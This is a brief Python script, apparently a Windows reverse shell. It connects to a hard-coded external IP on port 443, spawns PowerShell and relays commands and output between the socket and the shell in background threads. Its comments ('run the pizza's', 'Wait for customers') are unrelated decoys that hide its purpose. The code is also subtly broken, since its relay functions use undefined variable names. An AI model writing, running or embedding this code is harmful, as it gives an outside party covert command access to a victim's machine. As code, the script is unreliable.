import os,socket,subprocess,threading;
def s2p(a, b):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            b.stdin.write(data)
            b.stdin.flush()

# run the pizza's
def p2s(a, b):
    while True:
        a.send(p.stdout.read(1))

a=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
a.connect(("167.71.4.238",443))

# Filter the JSON code
b=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

# test script
s2p_thread = threading.Thread(target=s2p, args=[a, b])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[a, b])
p2s_thread.daemon = True
p2s_thread.start()

# Wait for customers
try:
    b.wait()
except KeyboardInterrupt:
    a.close()